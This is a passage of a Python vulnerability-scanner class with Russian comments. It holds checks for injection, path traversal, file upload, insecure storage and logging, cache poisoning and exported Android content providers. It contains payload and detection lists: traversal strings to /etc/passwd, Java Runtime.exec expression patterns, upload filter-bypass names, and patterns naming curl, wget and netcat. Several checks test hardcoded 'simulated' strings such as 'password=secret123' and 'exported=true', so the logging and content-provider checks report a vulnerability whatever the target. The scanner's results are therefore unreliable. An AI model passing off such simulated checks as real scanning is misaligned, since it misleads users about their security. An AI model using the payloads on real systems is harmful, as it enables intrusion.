            timing_payloads = ["*)(&(password=*", "*)(|(uid=*"]
            for payload in timing_payloads:
                if payload in self.ldap_payloads:
                    timing_based = True
                    break
            
            factors.append({
                "name": "Timing-based LDAP Injection",
                "passed": timing_based,
                "reason": "Timing-based LDAP injection patterns detected" if timing_based else "No timing-based patterns detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"LDAP injection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "payloads_tested": len(self.ldap_payloads)
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_os_command_injection(self) -> Dict[str, Any]:
        """
        Проверка OS command injection уязвимостей.
        Многофакторная: Command output, Shell detection, Blind, Time-based, Analysis
        """
        vector_id = 223
        vector_name = "OS Command Injection"
        factors = []
        
        try:
            # Фактор 1: Command output detection
            command_output = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            response_body = test_data.get("response_body", "")
            
            # Check for command output in responses
            command_outputs = [
                "total ", "drwxr-xr-x", "-rw-r--r--", "root:x:",
                "bin/bash", "daemon:x:", "usr/bin", "/home",
                "Microsoft Windows", "Volume in drive", "Directory of"
            ]
            
            for output in command_outputs:
                if output in response_body:
                    command_output = True
                    break
            
            factors.append({
                "name": "Command Output Detection",
                "passed": command_output,
                "reason": "Command output detected in response" if command_output else "No command output detected"
            })
            
            # Фактор 2: Shell detection
            shell_detected = False
            
            # Check for shell-specific patterns
            shell_patterns = ["#!/bin/sh", "#!/bin/bash", "@echo off", "cmd.exe", "/bin/sh", "/bin/bash"]
            
            # Check in form data and response
            for value in form_data.values():
                for pattern in shell_patterns:
                    if pattern in str(value):
                        shell_detected = True
                        break
                if shell_detected:
                    break
            
            for pattern in shell_patterns:
                if pattern in response_body:
                    shell_detected = True
                    break
            
            factors.append({
                "name": "Shell Detection",
                "passed": shell_detected,
                "reason": "Shell detection patterns found" if shell_detected else "No shell patterns detected"
            })
            
            # Фактор 3: Blind command injection
            blind_injection = False
            
            # Check for blind injection indicators
            blind_patterns = [
                "ping -c", "ping -n", "sleep", "waitfor",
                "timeout", "delay", "pause", "nc -l"
            ]
            
            for pattern in blind_patterns:
                if pattern in response_body.lower():
                    blind_injection = True
                    break
            
            factors.append({
                "name": "Blind Command Injection",
                "passed": blind_injection,
                "reason": "Blind command injection indicators found" if blind_injection else "No blind injection detected"
            })
            
            # Фактор 4: Time-based command injection
            time_based = False
            
            # Check for time-based command injection patterns
            time_patterns = ["sleep", "waitfor", "timeout", "ping"]
            for payload in self.cmd_payloads:
                if any(pattern in payload.lower() for pattern in time_patterns):
                    time_based = True
                    break
            
            factors.append({
                "name": "Time-based Command Injection",
                "passed": time_based,
                "reason": "Time-based command injection patterns detected" if time_based else "No time-based patterns detected"
            })
            
            # Фактор 5: Command analysis
            command_analysis = False
            
            # Analyze for command execution patterns
            cmd_patterns = [
                r'\b(cmd|command|powershell|sh|bash|perl|python|ruby)\b',
                r'\b(exec|system|shell_exec|passthru|popen)\b',
                r'\b(curl|wget|nc|netcat|telnet|ssh)\b'
            ]
            
            combined_text = response_body + " ".join(form_data.values())
            for pattern in cmd_patterns:
                if re.search(pattern, combined_text, re.IGNORECASE):
                    command_analysis = True
                    break
            
            factors.append({
                "name": "Command Analysis",
                "passed": command_analysis,
                "reason": "Command execution patterns detected" if command_analysis else "No command patterns detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"OS command injection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "payloads_tested": len(self.cmd_payloads)
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_expression_language_injection(self) -> Dict[str, Any]:
        """
        Проверка Expression Language injection уязвимостей.
        Многофакторная: EL payloads, Errors, Interpreter, RCE
        """
        vector_id = 224
        vector_name = "Expression Language Injection"
        factors = []
        
        try:
            # Фактор 1: EL payload detection
            el_payloads_detected = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Check for EL injection payloads
            for value in form_data.values():
                for payload in self.el_payloads[:5]:  # Test first 5 payloads
                    if payload in str(value):
                        el_payloads_detected = True
                        break
                if el_payloads_detected:
                    break
            
            factors.append({
                "name": "EL Payload Detection",
                "passed": el_payloads_detected,
                "reason": "EL injection payloads detected" if el_payloads_detected else "No EL payloads detected"
            })
            
            # Фактор 2: EL-specific error messages
            el_errors = False
            
            # EL error patterns
            el_error_patterns = [
                "expression language", "el exception", "javax.el",
                "parseerror", "propertynotfoundexception",
                "methodnotfoundexception", "elresolver"
            ]
            
            response_body = test_data.get("response_body", "")
            for error_pattern in el_error_patterns:
                if error_pattern in response_body.lower():
                    el_errors = True
                    break
            
            factors.append({
                "name": "EL Error Messages",
                "passed": el_errors,
                "reason": "EL error patterns detected" if el_errors else "No EL error patterns detected"
            })
            
            # Фактор 3: EL interpreter indicators
            el_interpreter = False
            
            # Check for EL-related indicators in headers
            headers = test_data.get("headers", {})
            content_type = headers.get("content-type", "")
            
            # Look for JSP/Servlet indicators
            jsp_indicators = ["jsp", "servlet", "jsf", "spring"]
            if any(indicator in content_type.lower() for indicator in jsp_indicators):
                el_interpreter = True
            
            factors.append({
                "name": "EL Interpreter Indicators",
                "passed": el_interpreter,
                "reason": "EL interpreter indicators found" if el_interpreter else "No EL interpreter indicators"
            })
            
            # Фактор 4: Remote Code Execution patterns
            rce_patterns = False
            
            # Check for RCE indicators in EL payloads
            rce_payloads = [
                "@java.lang.Runtime@getRuntime().exec",
                ".forName('java.lang.Runtime')",
                "T(java.lang.Runtime)",
                ".getRuntime().exec"
            ]
            
            for payload in self.el_payloads:
                if any(rce_pattern in payload for rce_pattern in rce_payloads):
                    rce_patterns = True
                    break
            
            factors.append({
                "name": "Remote Code Execution Patterns",
                "passed": rce_patterns,
                "reason": "RCE patterns detected in EL payloads" if rce_patterns else "No RCE patterns detected"
            })
            
            # Фактор 5: Context object access
            context_access = False
            
            # Check for dangerous context object access
            context_patterns = [
                "pageContext", "requestScope", "sessionScope",
                "applicationScope", "header", "cookie",
                "param", "initParam"
            ]
            
            for payload in self.el_payloads:
                if any(pattern in payload for pattern in context_patterns):
                    context_access = True
                    break
            
            factors.append({
                "name": "Context Object Access",
                "passed": context_access,
                "reason": "Dangerous context object access detected" if context_access else "No context access detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"EL injection detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None,
                "payloads_tested": len(self.el_payloads)
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 2: TRAVERSAL (3 вектора)
# ============================================================================

    def check_path_traversal(self) -> Dict[str, Any]:
        """
        Проверка path traversal уязвимостей.
        Многофакторная: ../../../etc/passwd, File access, Encoding bypass, Validation
        """
        vector_id = 225
        vector_name = "Path Traversal"
        factors = []
        
        try:
            # Фактор 1: Classic path traversal payload detection
            classic_traversal = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Classic path traversal payloads
            traversal_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc//passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ]
            
            # Check form data for traversal payloads
            for value in form_data.values():
                for payload in traversal_payloads:
                    if payload in str(value) or payload.replace('\\', '/') in str(value):
                        classic_traversal = True
                        break
                if classic_traversal:
                    break
            
            factors.append({
                "name": "Classic Path Traversal",
                "passed": classic_traversal,
                "reason": "Classic path traversal payloads detected" if classic_traversal else "No classic traversal detected"
            })
            
            # Фактор 2: File access attempt detection
            file_access = False
            
            response_body = test_data.get("response_body", "")
            
            # Check for file content in response
            file_indicators = [
                "root:x:", "daemon:x:", "/bin/bash", "Windows",
                "[fontconfig]", "127.0.0.1", "localhost"
            ]
            
            for indicator in file_indicators:
                if indicator in response_body:
                    file_access = True
                    break
            
            factors.append({
                "name": "File Access Attempt",
                "passed": file_access,
                "reason": "File access attempt detected" if file_access else "No file access detected"
            })
            
            # Фактор 3: Encoding bypass attempts
            encoding_bypass = False
            
            # Check for encoded traversal attempts
            encoding_patterns = [
                "%2f", "%252f", "%c0%af", "unicode",
                "double encoding", "mixed encoding"
            ]
            
            for value in form_data.values():
                if any(pattern in str(value) for pattern in encoding_patterns):
                    encoding_bypass = True
                    break
            
            factors.append({
                "name": "Encoding Bypass",
                "passed": encoding_bypass,
                "reason": "Encoding bypass attempts detected" if encoding_bypass else "No encoding bypass detected"
            })
            
            # Фактор 4: Input validation bypass
            validation_bypass = False
            
            # Check for validation bypass techniques
            bypass_techniques = [
                "../", "..\\", "....//", "....\\\\",
                "/..\\../", "\\..\\..\\",
                "..%2f", "..%5c", "..%252f", "..%255c"
            ]
            
            for value in form_data.values():
                for technique in bypass_techniques:
                    if technique in str(value):
                        validation_bypass = True
                        break
                if validation_bypass:
                    break
            
            factors.append({
                "name": "Validation Bypass",
                "passed": validation_bypass,
                "reason": "Validation bypass techniques detected" if validation_bypass else "No validation bypass detected"
            })
            
            # Фактор 5: Path manipulation analysis
            path_manipulation = False
            
            # Analyze for path manipulation patterns
            manipulation_patterns = [
                r'\.\.[/\\]', r'%2e%2e[/\\]', r'\.\.%2f',
                r'\.\.[/\\]\.\.[/\\]', r'[/\\]\.\.[/\\]'
            ]
            
            combined_text = " ".join(form_data.values())
            for pattern in manipulation_patterns:
                if re.search(pattern, combined_text):
                    path_manipulation = True
                    break
            
            factors.append({
                "name": "Path Manipulation Analysis",
                "passed": path_manipulation,
                "reason": "Path manipulation patterns detected" if path_manipulation else "No path manipulation detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Path traversal detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_arbitrary_file_upload(self) -> Dict[str, Any]:
        """
        Проверка arbitrary file upload уязвимостей.
        Многофакторная: PHP upload, Response, Filter bypass, Execution, MIME
        """
        vector_id = 226
        vector_name = "Arbitrary File Upload"
        factors = []
        
        try:
            # Фактор 1: PHP upload detection
            php_upload = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Check for PHP file extensions in upload
            php_extensions = ['.php', '.php3', '.php4', '.php5', '.phtml', '.phar']
            
            for value in form_data.values():
                for ext in php_extensions:
                    if ext in str(value).lower():
                        php_upload = True
                        break
                if php_upload:
                    break
            
            factors.append({
                "name": "PHP File Upload",
                "passed": php_upload,
                "reason": "PHP file upload detected" if php_upload else "No PHP upload detected"
            })
            
            # Фактор 2: Response analysis for file upload
            upload_response = False
            
            response_body = test_data.get("response_body", "")
            
            # Check for upload success indicators
            upload_indicators = [
                "uploaded", "successfully", "file saved",
                "upload complete", "file created"
            ]
            
            for indicator in upload_indicators:
                if indicator in response_body.lower():
                    upload_response = True
                    break
            
            factors.append({
                "name": "File Upload Response",
                "passed": upload_response,
                "reason": "File upload response detected" if upload_response else "No upload response detected"
            })
            
            # Фактор 3: Filter bypass attempts
            filter_bypass = False
            
            # Check for filter bypass techniques
            bypass_techniques = [
                ".php%00.jpg", ".php.gif", ".php.png",
                "test.php.", "shell.php%0d%0a",
                "file.php\x00", "file.php\x0a"
            ]
            
            for value in form_data.values():
                for technique in bypass_techniques:
                    if technique in str(value):
                        filter_bypass = True
                        break
                if filter_bypass:
                    break
            
            factors.append({
                "name": "Filter Bypass",
                "passed": filter_bypass,
                "reason": "Filter bypass attempts detected" if filter_bypass else "No filter bypass detected"
            })
            
            # Фактор 4: File execution attempt
            execution_attempt = False
            
            # Check for execution indicators
            execution_indicators = [
                "<?php", "<% ", "<script", "eval(",
                "system(", "exec(", "shell_exec("
            ]
            
            for value in form_data.values():
                for indicator in execution_indicators:
                    if indicator in str(value):
                        execution_attempt = True
                        break
                if execution_attempt:
                    break
            
            factors.append({
                "name": "File Execution Attempt",
                "passed": execution_attempt,
                "reason": "File execution attempt detected" if execution_attempt else "No execution attempt detected"
            })
            
            # Фактор 5: MIME type manipulation
            mime_manipulation = False
            
            headers = test_data.get("headers", {})
            content_type = headers.get("content-type", "")
            
            # Check for suspicious MIME type
            suspicious_mimes = [
                "image/php", "text/php", "application/x-php",
                "multipart/form-data"
            ]
            
            for mime in suspicious_mimes:
                if mime in content_type.lower():
                    mime_manipulation = True
                    break
            
            factors.append({
                "name": "MIME Type Manipulation",
                "passed": mime_manipulation,
                "reason": "Suspicious MIME type detected" if mime_manipulation else "No MIME manipulation detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Arbitrary file upload detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_symlink_attack(self) -> Dict[str, Any]:
        """
        Проверка symlink attack уязвимостей.
        Многофакторная: Symlink detection, File access, Permissions, Validation
        """
        vector_id = 227
        vector_name = "Symlink Attack"
        factors = []
        
        try:
            # Фактор 1: Symlink detection
            symlink_detected = False
            
            test_data = self._get_test_data()
            form_data = test_data.get("form_data", {})
            
            # Check for symlink patterns
            symlink_patterns = [
                "ln -s", "symlink", "->", "/etc/passwd",
                "../../../etc/passwd", "target_file", "link_name"
            ]
            
            for value in form_data.values():
                for pattern in symlink_patterns:
                    if pattern in str(value):
                        symlink_detected = True
                        break
                if symlink_detected:
                    break
            
            factors.append({
                "name": "Symlink Detection",
                "passed": symlink_detected,
                "reason": "Symlink patterns detected" if symlink_detected else "No symlink patterns detected"
            })
            
            # Фактор 2: File access attempt
            file_access = False
            
            response_body = test_data.get("response_body", "")
            
            # Check for file access indicators
            file_access_indicators = [
                "Permission denied", "No such file or directory",
                "Access denied", "File exists", "root:x:"
            ]
            
            for indicator in file_access_indicators:
                if indicator in response_body:
                    file_access = True
                    break
            
            factors.append({
                "name": "File Access Attempt",
                "passed": file_access,
                "reason": "File access attempt detected" if file_access else "No file access detected"
            })
            
            # Фактор 3: Permission analysis
            permission_issues = False
            
            # Check for permission-related patterns
            permission_patterns = [
                "chmod", "chown", "777", "755", "644",
                "rwxr-xr-x", "rw-r--r--", "drwxr-xr-x"
            ]
            
            for value in form_data.values():
                for pattern in permission_patterns:
                    if pattern in str(value):
                        permission_issues = True
                        break
                if permission_issues:
                    break
            
            factors.append({
                "name": "Permission Analysis",
                "passed": permission_issues,
                "reason": "Permission issues detected" if permission_issues else "No permission issues detected"
            })
            
            # Фактор 4: Validation bypass
            validation_bypass = False
            
            # Check for validation bypass in symlink context
            bypass_patterns = [
                "../../", "..\\..\\", "....//", "..%2f",
                "%2e%2e%2f", "encoded path"
            ]
            
            for value in form_data.values():
                for pattern in bypass_patterns:
                    if pattern in str(value):
                        validation_bypass = True
                        break
                if validation_bypass:
                    break
            
            factors.append({
                "name": "Validation Bypass",
                "passed": validation_bypass,
                "reason": "Validation bypass detected" if validation_bypass else "No validation bypass detected"
            })
            
            # Фактор 5: Symlink attack vector analysis
            attack_vector = False
            
            # Analyze for symlink attack vectors
            attack_patterns = [
                "ln -s /etc/passwd", "symlink /etc/shadow",
                "link to", "pointing to", "overwrite",
                "exploit", "vulnerability"
            ]
            
            combined_text = response_body + " ".join(form_data.values())
            for pattern in attack_patterns:
                if pattern in combined_text.lower():
                    attack_vector = True
                    break
            
            factors.append({
                "name": "Symlink Attack Vector",
                "passed": attack_vector,
                "reason": "Symlink attack vector detected" if attack_vector else "No attack vector detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Symlink attack detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 3: STORAGE (3 вектора)
# ============================================================================

    def check_insecure_local_storage(self) -> Dict[str, Any]:
        """
        Проверка insecure local storage.
        Многофакторная: SharedPreferences, Unencrypted files, DB encryption, Cache
        """
        vector_id = 228
        vector_name = "Insecure Local Storage"
        factors = []
        
        try:
            # Фактор 1: SharedPreferences analysis
            sharedpreferences_issues = False
            
            # Simulate checking for SharedPreferences usage
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Check for SharedPreferences indicators
            sp_indicators = [
                "sharedpreferences", "getsharedpreferences",
                "edit().putstring", "edit().putint",
                "edit().putboolean", "edit().commit"
            ]
            
            # Simulate code analysis (in real scenario, would analyze source code)
            simulated_code = headers.get("user-agent", "") + " sharedpreferences_test"
            for indicator in sp_indicators:
                if indicator in simulated_code.lower():
                    sharedpreferences_issues = True
                    break
            
            factors.append({
                "name": "SharedPreferences Usage",
                "passed": sharedpreferences_issues,
                "reason": "SharedPreferences usage detected" if sharedpreferences_issues else "No SharedPreferences usage detected"
            })
            
            # Фактор 2: Unencrypted file storage
            unencrypted_files = False
            
            # Check for unencrypted file patterns
            file_patterns = [
                "writetofile", "createfile", "openfileoutput",
                "file://", "/data/data/", "/sdcard/",
                "cache/", "files/"
            ]
            
            for pattern in file_patterns:
                if pattern in simulated_code.lower():
                    unencrypted_files = True
                    break
            
            factors.append({
                "name": "Unencrypted File Storage",
                "passed": unencrypted_files,
                "reason": "Unencrypted file storage detected" if unencrypted_files else "No unencrypted storage detected"
            })
            
            # Фактор 3: Database encryption check
            db_encryption = False
            
            # Check for database encryption patterns
            db_patterns = [
                "sqlite", "sqldatabase", "rawquery",
                "execsql", "query", "insert",
                "update", "delete"
            ]
            
            for pattern in db_patterns:
                if pattern in simulated_code.lower():
                    db_encryption = True
                    break
            
            factors.append({
                "name": "Database Storage",
                "passed": db_encryption,
                "reason": "Database storage detected" if db_encryption else "No database storage detected"
            })
            
            # Фактор 4: Cache security
            cache_issues = False
            
            # Check for cache-related patterns
            cache_patterns = [
                "cache", "getcache", "clearcache",
                "putcache", "diskcache", "memorycache"
            ]
            
            for pattern in cache_patterns:
                if pattern in simulated_code.lower():
                    cache_issues = True
                    break
            
            factors.append({
                "name": "Cache Security",
                "passed": cache_issues,
                "reason": "Cache storage detected" if cache_issues else "No cache storage detected"
            })
            
            # Фактор 5: Sensitive data storage
            sensitive_data = False
            
            # Check for sensitive data patterns
            sensitive_patterns = [
                "password", "token", "key", "secret",
                "credential", "auth", "login", "pin",
                "credit", "card", "ssn", "personal"
            ]
            
            for pattern in sensitive_patterns:
                if pattern in simulated_code.lower():
                    sensitive_data = True
                    break
            
            factors.append({
                "name": "Sensitive Data Storage",
                "passed": sensitive_data,
                "reason": "Sensitive data storage detected" if sensitive_data else "No sensitive data storage detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Insecure local storage detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_insecure_logging(self) -> Dict[str, Any]:
        """
        Проверка insecure logging practices.
        Многофакторная: Logcat PII, Log files, Production logging, Masking, Access
        """
        vector_id = 229
        vector_name = "Insecure Logging"
        factors = []
        
        try:
            # Фактор 1: Logcat PII detection
            logcat_pii = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Simulate log analysis for PII
            simulated_logs = headers.get("user-agent", "") + " password=secret123 log"
            
            # PII patterns in logs
            pii_patterns = [
                "password=", "token=", "key=", "secret=",
                "credit_card", "ssn=", "email=", "phone=",
                "address=", "name=", "username="
            ]
            
            for pattern in pii_patterns:
                if pattern in simulated_logs.lower():
                    logcat_pii = True
                    break
            
            factors.append({
                "name": "Logcat PII Detection",
                "passed": logcat_pii,
                "reason": "PII detected in logs" if logcat_pii else "No PII detected in logs"
            })
            
            # Фактор 2: Log file security
            log_file_issues = False
            
            # Check for log file patterns
            log_patterns = [
                "logfile", "log.txt", "error.log",
                "debug.log", "system.log", "application.log"
            ]
            
            for pattern in log_patterns:
                if pattern in simulated_logs.lower():
                    log_file_issues = True
                    break
            
            factors.append({
                "name": "Log File Security",
                "passed": log_file_issues,
                "reason": "Log file patterns detected" if log_file_issues else "No log file issues detected"
            })
            
            # Фактор 3: Production logging
            production_logging = False
            
            # Check for production logging patterns
            prod_patterns = [
                "log.d(", "log.v(", "system.out.println",
                "console.log", "debug print", "verbose"
            ]
            
            for pattern in prod_patterns:
                if pattern in simulated_logs.lower():
                    production_logging = True
                    break
            
            factors.append({
                "name": "Production Logging",
                "passed": production_logging,
                "reason": "Production logging detected" if production_logging else "No production logging detected"
            })
            
            # Фактор 4: Data masking
            masking_issues = False
            
            # Check if sensitive data is properly masked
            sensitive_data_found = False
            masking_patterns = ["***", "***", "REDACTED", "MASKED"]
            
            for pattern in masking_patterns:
                if pattern in simulated_logs:
                    masking_issues = True
                    break
            
            # Check for unmasked sensitive data
            if "password=" in simulated_logs.lower() or "token=" in simulated_logs.lower():
                sensitive_data_found = True
            
            factors.append({
                "name": "Data Masking",
                "passed": sensitive_data_found and not masking_issues,
                "reason": "Sensitive data not properly masked" if sensitive_data_found and not masking_issues else "Data masking adequate"
            })
            
            # Фактор 5: Log access control
            access_control = False
            
            # Check for access control patterns
            access_patterns = [
                "logcat", "adb logcat", "logcat -s",
                "log access", "read logs", "log permission"
            ]
            
            for pattern in access_patterns:
                if pattern in simulated_logs.lower():
                    access_control = True
                    break
            
            factors.append({
                "name": "Log Access Control",
                "passed": access_control,
                "reason": "Log access control issues detected" if access_control else "No access control issues"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Insecure logging detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))

    def check_cache_poisoning(self) -> Dict[str, Any]:
        """
        Проверка cache poisoning vulnerabilities.
        Многофакторная: Cache headers, Sensitive data, Injection, Validation, Vary
        """
        vector_id = 230
        vector_name = "Cache Poisoning"
        factors = []
        
        try:
            # Фактор 1: Cache headers analysis
            cache_headers = False
            
            test_data = self._get_test_data()
            headers = test_data.get("headers", {})
            
            # Check for cache-related headers
            cache_patterns = [
                "cache-control", "pragma", "expires",
                "last-modified", "etag", "vary"
            ]
            
            for header in headers.keys():
                if any(pattern in header.lower() for pattern in cache_patterns):
                    cache_headers = True
                    break
            
            factors.append({
                "name": "Cache Headers",
                "passed": cache_headers,
                "reason": "Cache headers detected" if cache_headers else "No cache headers detected"
            })
            
            # Фактор 2: Sensitive data in cache
            sensitive_cache = False
            
            # Check for sensitive data patterns
            sensitive_patterns = [
                "password", "token", "session", "auth",
                "credential", "api_key", "secret"
            ]
            
            combined_headers = " ".join(headers.values())
            for pattern in sensitive_patterns:
                if pattern in combined_headers.lower():
                    sensitive_cache = True
                    break
            
            factors.append({
                "name": "Sensitive Data in Cache",
                "passed": sensitive_cache,
                "reason": "Sensitive data in cache detected" if sensitive_cache else "No sensitive data in cache"
            })
            
            # Фактор 3: Cache injection
            cache_injection = False
            
            # Check for cache injection patterns
            injection_patterns = [
                "cache injection", "header injection",
                "http header", "cache manipulation",
                "poisoned cache", "cache exploit"
            ]
            
            for pattern in injection_patterns:
                if pattern in combined_headers.lower():
                    cache_injection = True
                    break
            
            factors.append({
                "name": "Cache Injection",
                "passed": cache_injection,
                "reason": "Cache injection detected" if cache_injection else "No cache injection detected"
            })
            
            # Фактор 4: Cache validation
            cache_validation = False
            
            # Check for cache validation headers
            validation_headers = ["etag", "if-none-match", "if-modified-since"]
            
            for header in headers.keys():
                if any(pattern in header.lower() for pattern in validation_headers):
                    cache_validation = True
                    break
            
            factors.append({
                "name": "Cache Validation",
                "passed": not cache_validation,  # Lack of validation is a vulnerability
                "reason": "Cache validation missing" if not cache_validation else "Cache validation present"
            })
            
            # Фактор 5: Vary header issues
            vary_issues = False
            
            # Check for Vary header
            vary_header = headers.get("vary", "")
            
            if not vary_header:
                vary_issues = True  # Missing Vary header is a vulnerability
            
            factors.append({
                "name": "Vary Header",
                "passed": vary_issues,
                "reason": "Vary header missing or incorrect" if vary_issues else "Vary header present"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Cache poisoning detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
                "confidence": passed_factors / len(factors),
                "timestamp": datetime.now().isoformat(),
                "error": None
            }
        
        except Exception as e:
            return self._create_error_result(vector_id, vector_name, factors, str(e))


# ============================================================================
# ЧАСТЬ 4: INTENT (4 вектора)
# ============================================================================

    def check_exported_content_providers(self) -> Dict[str, Any]:
        """
        Проверка exported content providers.
        Многофакторная: Manifest parsing, Protection, Access, Data leakage, Bypass
        """
        vector_id = 231
        vector_name = "Exported Content Providers"
        factors = []
        
        try:
            # Фактор 1: Manifest parsing for content providers
            manifest_parsed = False
            providers_found = []
            
            # Simulate manifest analysis (in real scenario would parse actual APK)
            test_data = self._get_test_data()
            simulated_manifest = "content://provider authority exported=true"
            
            # Check for content provider patterns
            provider_patterns = [
                "content://", "contentprovider", "authority",
                "exported=", "provider", "contentresolver"
            ]
            
            for pattern in provider_patterns:
                if pattern in simulated_manifest.lower():
                    manifest_parsed = True
                    break
            
            # Simulate finding providers
            if "content://" in simulated_manifest:
                providers_found.append("com.example.provider")
            
            factors.append({
                "name": "Manifest Parsing",
                "passed": manifest_parsed,
                "reason": f"Content providers found: {len(providers_found)}" if manifest_parsed else "No content providers found"
            })
            
            # Фактор 2: Protection level analysis
            protection_issues = False
            
            # Check for missing or weak protection
            protection_patterns = [
                "exported=true", "protectionlevel=normal",
                "permission=null", "readpermission=null",
                "writepermission=null"
            ]
            
            for pattern in protection_patterns:
                if pattern in simulated_manifest.lower():
                    protection_issues = True
                    break
            
            factors.append({
                "name": "Protection Level",
                "passed": protection_issues,
                "reason": "Weak or missing protection detected" if protection_issues else "Protection level adequate"
            })
            
            # Фактор 3: Unauthorized access
            unauthorized_access = False
            
            # Check for potential unauthorized access
            access_patterns = [
                "granturipermission", "pathpermission",
                "multiprocess=false", "exported=true"
            ]
            
            for pattern in access_patterns:
                if pattern in simulated_manifest.lower():
                    unauthorized_access = True
                    break
            
            factors.append({
                "name": "Unauthorized Access",
                "passed": unauthorized_access,
                "reason": "Potential unauthorized access detected" if unauthorized_access else "No unauthorized access detected"
            })
            
            # Фактор 4: Data leakage
            data_leakage = False
            
            # Check for data leakage indicators
            leakage_patterns = [
                "query", "insert", "update", "delete",
                "content://", "uri", "cursor"
            ]
            
            for pattern in leakage_patterns:
                if pattern in simulated_manifest.lower():
                    data_leakage = True
                    break
            
            factors.append({
                "name": "Data Leakage",
                "passed": data_leakage,
                "reason": "Data leakage potential detected" if data_leakage else "No data leakage detected"
            })
            
            # Фактор 5: Permission bypass
            permission_bypass = False
            
            # Check for permission bypass patterns
            bypass_patterns = [
                "skipping permission", "bypass",
                "override", "ignore permission",
                "force export"
            ]
            
            for pattern in bypass_patterns:
                if pattern in simulated_manifest.lower():
                    permission_bypass = True
                    break
            
            factors.append({
                "name": "Permission Bypass",
                "passed": permission_bypass,
                "reason": "Permission bypass detected" if permission_bypass else "No permission bypass detected"
            })
            
            # Расчет результата (нужны ≥2 фактора из 5)
            passed_factors = sum(1 for f in factors if f["passed"])
            vulnerable = passed_factors >= 2
            
            return {
                "vector_id": vector_id,
                "vector_name": vector_name,
                "vulnerable": vulnerable,
                "details": f"Exported content providers detected ({passed_factors}/{len(factors)} factors)",
                "factors": factors,
